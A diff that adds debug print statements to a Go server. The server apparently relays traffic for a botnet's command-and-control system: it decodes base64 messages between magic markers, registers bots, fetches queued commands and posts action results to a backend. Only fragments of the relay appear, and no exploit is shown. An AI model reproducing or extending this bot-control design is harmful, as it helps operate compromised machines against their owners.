@@ -38,6 +38,7 @@ var MAGICTERMBYTE = MAGICTERM[0]
 var MAGICTERMSTR = string(MAGICTERM)
 
 func main() {
+	fmt.Println("In main")
 	portStr := ":" + PORT
 	l, err := net.Listen("tcp4", portStr)
 	if err != nil {
@@ -58,6 +59,7 @@ func main() {
 }
 
 func connHandle(conn net.Conn) {
+	fmt.Println("In connHandle")
 	message, err := bufio.NewReader(conn).ReadString(MAGICTERMBYTE)
 	decMsg := decodePayload(message)
 	fmt.Printf("Incoming Message: %s\n", decMsg)
@@ -73,6 +75,7 @@ func connHandle(conn net.Conn) {
 
 // take buffer from conn handler, turn it into a string
 func decodePayload(payload string) string {
+	fmt.Println("In decodePayload")
 	encodedPayload := strings.Replace(payload, MAGICSTR, "", -1) //trim magic chars from payload
 	encodedPayload = strings.Replace(encodedPayload, MAGICTERMSTR, "", -1)
 	data, err := base64.StdEncoding.DecodeString(encodedPayload)
@@ -84,6 +87,7 @@ func decodePayload(payload string) string {
 }
 
 func encodePayload(data string) string {
+	fmt.Println("In encodePayload")
 	encStr := base64.StdEncoding.EncodeToString([]byte(data))
 	fin := MAGICSTR + encStr + MAGICTERMSTR
 	return fin
@@ -91,6 +95,7 @@ func encodePayload(data string) string {
 
 // take string of payload, depending on mode/arguments: handle it
 func handlePayload(payload string) string {
+	fmt.Println("In handPayload")
 	splitPayload := strings.SplitN(payload, "||", 3)
 	mode := splitPayload[0]
 	aid := splitPayload[1]
@@ -111,6 +116,7 @@ func handlePayload(payload string) string {
 
 // take params from bot and register it in the DB
 func registerBot(payload string) string {
+	fmt.Println("In registerbot")
 	url := CORE + "/register/bot"
 	splitPayload := strings.Split(payload, "||")
 	uid := splitPayload[0]
@@ -133,6 +139,7 @@ func registerBot(payload string) string {
 }
 
 func parseCommands(cstr string) string {
+	fmt.Println("In parsecommands")
 	retStr := ""
 	carr := strings.Split(cstr, "}, {")
 	for _, comStr := range carr {
@@ -151,6 +158,7 @@ func parseCommands(cstr string) string {
 
 // pull all commands from DB with associated uuid
 func getCommands(payload string) string {
+	fmt.Println("In getCommands")
 	url := CORE + "/get/command"
 	uid := payload
 	cli := http.Client{}
@@ -171,6 +179,7 @@ func getCommands(payload string) string {
 }
 
 func postResult(aid string, result string) {
+	fmt.Println("In postresult")
 	url := CORE + "/add/actionresult"
 	cli := http.Client{}
 	prejson := `{"actionid":"` + aid + `", "data":"` + result + `"}`
@@ -183,6 +192,7 @@ func postResult(aid string, result string) {
 
 // send the action result back to the DB for feedback tracking
 func addResult(payload string, aid string) string {
+	fmt.Println("In addresult")
 	resArray := strings.Split(payload, "<||>")
 	for _, res := range resArray {
 		splitRes := strings.Split(res, ":")
